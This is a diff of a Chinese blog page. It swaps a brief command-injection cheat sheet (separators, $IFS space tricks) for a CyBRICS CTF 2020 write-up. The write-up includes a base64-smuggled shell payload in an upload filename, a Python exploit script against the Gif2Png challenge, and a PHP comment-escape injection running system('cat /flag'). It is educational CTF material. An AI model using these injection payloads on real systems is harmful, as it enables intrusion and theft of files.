@@ -22,12 +22,12 @@
   
   
   
-  <title>命令执行 | iluem&#39;Blog</title>
+  <title>CyBRICS CTF 2020 Writeup | iluem&#39;Blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="Web,知识点," />
+    <meta name="keywords" content="Web,CTF," />
   
 
   <script>
@@ -227,12 +227,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>命令执行</span>
+    <span>CyBRICS CTF 2020 Writeup</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2020-07-15
+      2020-07-28
     </span>
     
       <span>
@@ -244,7 +244,7 @@
     
     
       <span>
-        浏览 : <span class="article-timer" data-identity="passages命令执行"></span>
+        浏览 : <span class="article-timer" data-identity="passagesXCTF-CyBRICS"></span>
       </span>
     
   </div>
@@ -253,18 +253,141 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <h1 id="命令执行的分隔符"><a href="#命令执行的分隔符" class="headerlink" title="命令执行的分隔符"></a>命令执行的分隔符</h1><p><strong>换行符</strong>    %0a</p>
-<p><strong>回车符</strong>    %0d</p>
-<p><strong>连续指令</strong>    ；</p>
-<p><strong>后台进程</strong>     &amp;</p>
-<p><strong>管道符</strong>    |</p>
-<p><strong>逻辑</strong>    ||    &amp;&amp;</p>
-<h1 id="命令执行的空格代替"><a href="#命令执行的空格代替" class="headerlink" title="命令执行的空格代替"></a>命令执行的空格代替</h1><p>&lt;</p>
-<p>$IFS</p>
-<p>${IFS}</p>
-<p>$IFS$9</p>
-<p>%09(tab)</p>
+      <h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>一道简单的js，大致思路是通过控制台修改js里的函数然后删除已有的标签，重新运行初始化函数即可。</p>
+<h2 id="Gif2Png"><a href="#Gif2Png" class="headerlink" title="Gif2Png"></a>Gif2Png</h2><p>题目给了源码，flag在main.py文件中，利用的点很明显就是如下所示代码，其中文件名是可控的，所以直接命令注入即可。</p>
+<pre><code class="python">command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre>
+<p>但是没有回显而且不出网，因此只能将文件复制到可以访问的地方，其中给了一个路由</p>
+<pre><code class="python">@app.route(&#39;/uploads/&lt;uid&gt;/&lt;image&gt;&#39;)
+def image(uid, image):
+    logging.debug(request.headers)
+    dir = str(Path(app.config[&#39;UPLOAD_FOLDER&#39;]) / uid)
+    return send_from_directory(dir, image)</code></pre>
+<p>所以可以把文件拷贝到uploads/uid下来即可，uid会在上传时候给你返回的。也可在uploads下生成路径+文件名。</p>
+<p>但要注意其中过滤了的内容过滤了的字符。</p>
+<pre><code class="python"> if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)) or &quot;..&quot; in file.filename:
+            logging.debug(f&#39;Invalid symbols in filename: {file.content_type}&#39;)
+            flash(&#39;Invalid filename&#39;, &#39;danger&#39;)
+            return redirect(request.url)</code></pre>
+<p>其中给了|和=，因此命令可以用base64编码绕过。</p>
+<pre><code class="python">filename=&quot;&#39;||echo &#39;dGFyIC1jdmYgIHVwbG9hZHMvNWFkZmZkYmEtZjdiZS00YTAwLWI2NTItZDMzNjVhODJlYjc4LzMudGFyICo=&#39;|base64 -d|sh||&#39;2.gif&quot;</code></pre>
+<pre><code>ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\
 
+&#39;||echo &#39;tar -cvf  uploads/5adffdba-f7be-4a00-b652-d3365a82eb78/3.tar *&#39;|base64 -d|sh||&#39;2.gif</code></pre><p>当然可以用的命令还有 <code>cp main.py uploads/iluem/main.py</code>。</p>
+<p>参考python 脚本如下</p>
+<pre><code class="python">import requests, base64
+
+# Shellcode to execute 
+shellcode = &quot;mkdir uploads/iluem &amp;&amp;tar -cvf uploads/iluem/main.py main.py&quot;
+#tar -cvf  uploads/5adffdba-f7be-4a00-b652-d3365a82eb78/3.tar *
+# b64 encoded shellcode
+encoded = base64.b64encode(shellcode.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)
+
+print(encoded)
+# Exploit string
+exp = f&quot;\&#39;||echo \&#39;{encoded}\&#39;|base64 -d|sh||\&#39;1.gif&quot;
+
+# Upload file
+files = {&#39;file&#39;:(exp, open(&#39;2.gif&#39;, &#39;rb&#39;), &#39;image/gif&#39;)}
+r = requests.post(&quot;http://gif2png-cybrics2020.ctf.su/&quot;, files=files)</code></pre>
+<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>这题代码有点多，但是可以利用的点似乎只有在calc里。</p>
+<pre><code class="php">//calc.php
+&lt;?php
+if (!@$_SESSION[&#39;userid&#39;]) {
+    redir(&quot;.&quot;);
+} elseif (!@$_GET[&#39;template&#39;]) {
+    redir(&quot;.&quot;);
+}
+
+$userid = $_SESSION[&#39;userid&#39;];
+$template = $_GET[&#39;template&#39;];
+
+if (!preg_match(&#39;#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s&#39;, $template)) {
+    redir(&quot;.&quot;);
+}
+if (!is_file(&quot;calcs/$userid/templates/$template.html&quot;)) {
+    redir(&quot;.&quot;);
+}
+//;eval(system(cp /flag /var/www/iluem.txt));
+//;eval(system(&quot;cp /flag /var/www/321.txt&quot;)) ?&gt;
+    //tar -cvf  /var/www/html/222.html /flag
+if (trim(@$_POST[&#39;field&#39;])) {
+    $field = trim($_POST[&#39;field&#39;]);
+
+    if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
+        $value = &quot;BAD&quot;;
+    } else {
+        if (@$_POST[&#39;share&#39;]) {
+            $calc = uuid();
+            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);
+        } else {
+            try {
+                $value = eval(&quot;return $field;&quot;);
+            } catch (Throwable $e) {
+                $value = null;
+            }
+
+            if (!is_numeric($value) &amp;&amp; !is_string($value)) {
+                $value = &quot;ERROR&quot;;
+            } else {
+                $value = (string)$value;
+            }
+        }
+    }
+
+    echo &quot;&lt;script&gt;var preloadValue = &quot; . json_encode($value) . &quot;;&lt;/script&gt;&quot;;
+}
+
+require &quot;inc/calclib.html&quot;;
+require &quot;calcs/$userid/templates/$template.html&quot;;</code></pre>
+<p>但是比赛时思路太死了,一直在想怎么执行eval。却忽视了share里的内容，说到底还是读代码能力不足。</p>
+<p>正则里的限制太多，导致了可用的字符太少。赛后看到<a href="https://www.gem-love.com/ctf/2526.html" target="_blank" rel="noopener">奇奇师傅</a>的题解才顿悟。涨知识了。首先题目给了一个注册功能。用来获得session，同时允许我们上传计算模板的html。可以根据calc里的参数找到newtemplate.php里的内容。上里边限制了上传的内容不能有<code>&lt;?</code>而且必须包含计算器功能的id标签。</p>
+<pre><code class="php">//newtemplate.php
+&lt;?php
+    ···
+if (trim(@$_POST[&#39;html&#39;])) {
+    do {
+        $html = trim($_POST[&#39;html&#39;]);
+        if (strpos($html, &#39;&lt;?&#39;) !== false) {
+            $error = &quot;Bad chars&quot;;
+            break;
+        }
+
+        $requiredBlocks = [
+            &#39;id=&quot;back&quot;&#39;,
+            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
+            &#39;id=&quot;digit0&quot;&#39;,
+            &#39;id=&quot;digit1&quot;&#39;,
+            &#39;id=&quot;digit2&quot;&#39;,
+            &#39;id=&quot;digit3&quot;&#39;,
+            &#39;id=&quot;digit4&quot;&#39;,
+            &#39;id=&quot;digit5&quot;&#39;,
+            &#39;id=&quot;digit6&quot;&#39;,
+            &#39;id=&quot;digit7&quot;&#39;,
+            &#39;id=&quot;digit8&quot;&#39;,
+            &#39;id=&quot;digit9&quot;&#39;,
+            &#39;id=&quot;plus&quot;&#39;,
+            &#39;id=&quot;equals&quot;&#39;,
+        ];
+
+        foreach ($requiredBlocks as $block) {
+            if (strpos($html, $block) === false) {
+                $error = &quot;Missing required block: &#39;$block&#39;&quot;;
+                break(2);
+            }
+        }
+    ···</code></pre>
+<p>这中间有个点就是calc里<code>require</code>了<code>calclib.html</code>和<code>template.html</code>但是只有传递了时才会用到。</p>
+<pre><code class="php">if (@$_POST[&#39;share&#39;]) {
+            $calc = uuid();
+            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);</code></pre>
+<p>可控变量<code>$filed</code>与后边两个html进行拼接，引用<code>&lt;?=总是可用的(即作为echo 调用)</code>。因此可以利用前边的&lt;? 后边构造 命令执行的语句即可。通过使用注释符将两者中间的html文件注释掉，并在template中写入恶意代码就能完成。</p>
+<pre><code class="php">&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))</code></pre>
+<p>上传html代码并在结尾加上<code>;eval(system(&#39;cat flag&#39;))?&gt;</code>并且构造<code>$field=/*((*/1))/*</code>然后文件就会变成<code>()匹配正则</code></p>
+<pre><code class="php">var preloadValue = &lt;?=json_encode((string)(1))/*···*/;eval(system(&#39;cat /flag&#39;))?&gt;</code></pre>
+<p>这样，利用多行注释闭合了<code>json_encode()</code>的同时也让php命令从中逃逸出来成功执行，得到flag</p>
+<pre><code>&lt;script&gt;var preloadValue = &quot;1&quot;cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</code></pre>
     </div>
   </div>
   
@@ -280,8 +403,8 @@
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
-              #知识点
+            <a href="/tags/CTF/">
+              #CTF
             </a>
           </span>
           
@@ -306,13 +429,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/passagesSQL/" target="_self">SQL注入相关知识点</a>
+        <a href="/passagessqli-labs/" target="_self">Sqli-labs</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/passagessqli-labs/" target="_self">Sqli-labs</a>
+        <a href="/passagesBUUCTF/" target="_self">BUUCTF WriteUp</a>
         <i class="iconfont icon-next"></i>
       </div>
     
